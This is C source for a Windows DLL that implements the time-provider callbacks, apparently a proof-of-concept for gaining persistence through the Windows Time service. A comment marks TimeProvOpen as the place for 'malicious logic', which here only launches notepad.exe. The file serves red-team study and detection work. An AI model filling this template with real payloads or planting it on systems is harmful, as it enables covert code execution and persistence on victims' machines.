#include <windows.h>
#include <stdio.h>


typedef enum TimeSysInfo {
	TSI_LastSyncTime,
	TSI_ClockTickSize,
	TSI_ClockPrecision,
	TSI_CurrentTime,
	TSI_PhaseOffset,
	TSI_TickCount,
	TSI_LeapFlags,
	TSI_Stratum,
	TSI_ReferenceIdentifier,
	TSI_PollInterval,
	TSI_RootDelay,
	TSI_RootDispersion,
	TSI_TSFlags,
	TSI_SeriviceRole,
	TSI_CurrentUtcOffset,
} TimeSysInfo;

typedef HRESULT(__stdcall GetTimeSysInfoFunc)(
	IN TimeSysInfo eInfo,
	OUT void* pvInfo
	);

typedef HRESULT(__stdcall LogTimeProvEventFunc)(
	IN WORD wType,
	IN WCHAR* wszProvName,
	IN WCHAR* wszMessage
	);

typedef HRESULT(__stdcall AlertSamplesAvailFunc)(void);

typedef enum TimeProvState {
	TPS_Running,
	TPS_Error,
} TimeProvState;

typedef void(__stdcall SetProviderStatusInfoFreeFunc)(IN struct SetProviderStatusInfo* pspsi);

typedef struct SetProviderStatusInfo {
	TimeProvState tpsCurrentState;
	DWORD dwStratum;
	LPWSTR wszProvName;
	HANDLE hWaitEvent;
	SetProviderStatusInfoFreeFunc* pfnFree;
	HRESULT* pHr;
	DWORD* pdwSysStratum;
} SetProviderStatusInfo;

typedef HRESULT(__stdcall SetProviderStatusFunc)(IN SetProviderStatusInfo* pspsi);

typedef struct TimeProvSysCallbacks {
	DWORD dwSize;
	GetTimeSysInfoFunc* pfnGetTimeSysInfo;
	LogTimeProvEventFunc* pfnLogTimeProvEvent;
	AlertSamplesAvailFunc* pfnAlertSamplesAvail;
	SetProviderStatusFunc* pfnSetProviderStatus;
} TimeProvSysCallbacks;

typedef void* TimeProvHandle;

typedef enum TimeProvCmd {
	TPC_TimeJumped,
	TPC_UpdateConfig,
	TPC_PollIntervalChanged,
	TPC_GetSamples,
	TPC_NetTopoChange,
	TPC_Query,
	TPC_Shutdown,
	TPC_GetMetaDataSamples
} TimeProvCmd;

typedef void* TimeProvArgs;


// Malicious logic here
__declspec(dllexport) HRESULT TimeProvOpen(	PWSTR wszName,	TimeProvSysCallbacks * pSysCallbacks,	TimeProvHandle * phTimeProv)
{
	
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	SecureZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	SecureZeroMemory(&pi, sizeof(pi));
	const wchar_t* tp = L"notepad.exe";
	CreateProcessW((LPWSTR)tp, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	return S_OK;
}

__declspec(dllexport) HRESULT TimeProvClose(PWSTR wszName,	TimeProvSysCallbacks * pSysCallbacks,	TimeProvHandle * phTimeProv)
{

	return S_OK;
}



__declspec(dllexport) HRESULT TimeProvCommand(TimeProvHandle hTimeProv,TimeProvCmd eCmd,	TimeProvArgs pvArgs)
{

	return S_OK;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		DisableThreadLibraryCalls(hinstDLL);
		break;
	case DLL_THREAD_ATTACH:
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_DETACH:
		break;
	}

	return TRUE;
}
